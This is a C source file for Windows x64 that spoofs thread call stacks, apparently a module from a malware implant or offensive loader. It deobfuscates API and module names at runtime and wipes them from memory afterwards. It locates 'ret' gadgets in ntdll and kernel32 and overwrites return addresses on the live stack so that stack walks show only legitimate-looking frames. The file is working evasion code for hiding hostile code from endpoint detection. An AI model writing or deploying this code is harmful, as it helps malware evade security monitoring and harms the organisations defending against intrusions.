/*
 * Thread Stack Spoofing — all strings obfuscated
 */

#include "stackspoof.h"
#include "winapi.h"
#include "obfstr.h"

#if ENABLE_STACK_SPOOF

typedef VOID    (NTAPI *fnRtlCaptureContext)(PCONTEXT);
typedef PVOID   (NTAPI *fnRtlLookupFunctionEntry)(ULONG_PTR, PULONG_PTR, PVOID);
typedef PVOID   (NTAPI *fnRtlVirtualUnwind)(ULONG, ULONG_PTR, ULONG_PTR, PVOID, PCONTEXT, PVOID*, PULONG_PTR, PVOID);

static fnRtlCaptureContext      pRtlCaptureContext      = NULL;
static fnRtlLookupFunctionEntry pRtlLookupFunctionEntry = NULL;
static fnRtlVirtualUnwind       pRtlVirtualUnwind       = NULL;

static ULONG_PTR g_NtdllRetGadget   = 0;
static ULONG_PTR g_K32RetGadget     = 0;
static HMODULE   g_hNtdll           = NULL;
static HMODULE   g_hK32             = NULL;

static ULONG_PTR FindRetGadget(PVOID module_base) {
    PBYTE base = (PBYTE)module_base;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            PBYTE section_start = base + sections[i].VirtualAddress;
            DWORD section_size  = sections[i].Misc.VirtualSize;
            for (DWORD j = 0; j < section_size; j++) {
                if (section_start[j] == 0xC3) {
                    return (ULONG_PTR)&section_start[j];
                }
            }
        }
    }
    return 0;
}

static BOOL IsAddrInModule(ULONG_PTR addr, PVOID module_base) {
    PBYTE base = (PBYTE)module_base;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
    return (addr >= (ULONG_PTR)base && addr < (ULONG_PTR)base + image_size);
}

BOOL StackSpoofInit(void) {
    char s_ntdll[OBF_NTDLL_LEN];
    deobf(s_ntdll, OBF_NTDLL, OBF_NTDLL_LEN);
    g_hNtdll = g_Api.pGetModuleHandleA(s_ntdll);

    char s_k32[OBF_KERNEL32_LEN];
    deobf(s_k32, OBF_KERNEL32, OBF_KERNEL32_LEN);
    g_hK32 = g_Api.pGetModuleHandleA(s_k32);

    if (!g_hNtdll || !g_hK32) {
        SecureZeroMemory(s_ntdll, sizeof(s_ntdll));
        SecureZeroMemory(s_k32, sizeof(s_k32));
        return FALSE;
    }

    char s_cap[OBF_RTLCAPTURECTX_LEN];
    deobf(s_cap, OBF_RTLCAPTURECTX, OBF_RTLCAPTURECTX_LEN);
    pRtlCaptureContext = (fnRtlCaptureContext)g_Api.pGetProcAddress(g_hNtdll, s_cap);
    SecureZeroMemory(s_cap, sizeof(s_cap));

    char s_look[OBF_RTLLOOKUP_LEN];
    deobf(s_look, OBF_RTLLOOKUP, OBF_RTLLOOKUP_LEN);
    pRtlLookupFunctionEntry = (fnRtlLookupFunctionEntry)g_Api.pGetProcAddress(g_hNtdll, s_look);
    SecureZeroMemory(s_look, sizeof(s_look));

    char s_unw[OBF_RTLVIRTUALUNWIND_LEN];
    deobf(s_unw, OBF_RTLVIRTUALUNWIND, OBF_RTLVIRTUALUNWIND_LEN);
    pRtlVirtualUnwind = (fnRtlVirtualUnwind)g_Api.pGetProcAddress(g_hNtdll, s_unw);
    SecureZeroMemory(s_unw, sizeof(s_unw));

    SecureZeroMemory(s_ntdll, sizeof(s_ntdll));
    SecureZeroMemory(s_k32, sizeof(s_k32));

    if (!pRtlCaptureContext || !pRtlLookupFunctionEntry || !pRtlVirtualUnwind)
        return FALSE;

    g_NtdllRetGadget = FindRetGadget(g_hNtdll);
    g_K32RetGadget   = FindRetGadget(g_hK32);

    return (g_NtdllRetGadget != 0 && g_K32RetGadget != 0);
}

BOOL SpoofStack(PSTACK_SPOOF_CTX ctx) {
    if (!pRtlCaptureContext) return FALSE;

    ZeroMemory(ctx, sizeof(STACK_SPOOF_CTX));

    CONTEXT thread_ctx;
    ZeroMemory(&thread_ctx, sizeof(CONTEXT));
    thread_ctx.ContextFlags = CONTEXT_FULL;
    pRtlCaptureContext(&thread_ctx);

    ULONG_PTR image_base = 0;
    DWORD frame_idx = 0;

    while (frame_idx < MAX_SPOOF_FRAMES && thread_ctx.Rip != 0) {
        PVOID func_entry = pRtlLookupFunctionEntry(
            thread_ctx.Rip, &image_base, NULL);

        if (!func_entry) break;

        BOOL is_legit = IsAddrInModule(thread_ctx.Rip, g_hNtdll) ||
                        IsAddrInModule(thread_ctx.Rip, g_hK32);

        if (!is_legit) {
            PVOID rsp_location = (PVOID)thread_ctx.Rsp;
            ctx->original_ret_addrs[frame_idx] = *(ULONG_PTR *)rsp_location;
            ctx->frame_locations[frame_idx] = rsp_location;
            *(ULONG_PTR *)rsp_location =
                (frame_idx % 2 == 0) ? g_NtdllRetGadget : g_K32RetGadget;
            frame_idx++;
        }

        PVOID handler_data = NULL;
        ULONG_PTR establisher_frame = 0;
        pRtlVirtualUnwind(0, image_base,
            thread_ctx.Rip, func_entry, &thread_ctx,
            &handler_data, &establisher_frame, NULL);
    }

    ctx->frame_count = frame_idx;
    ctx->is_spoofed = (frame_idx > 0);
    return ctx->is_spoofed;
}

BOOL DespoofStack(PSTACK_SPOOF_CTX ctx) {
    if (!ctx->is_spoofed) return FALSE;

    for (DWORD i = 0; i < ctx->frame_count; i++) {
        if (ctx->frame_locations[i]) {
            *(ULONG_PTR *)ctx->frame_locations[i] = ctx->original_ret_addrs[i];
        }
    }

    ctx->is_spoofed = FALSE;
    return TRUE;
}

#else
BOOL StackSpoofInit(void) { return TRUE; }
BOOL SpoofStack(PSTACK_SPOOF_CTX ctx) { (void)ctx; return TRUE; }
BOOL DespoofStack(PSTACK_SPOOF_CTX ctx) { (void)ctx; return TRUE; }
#endif
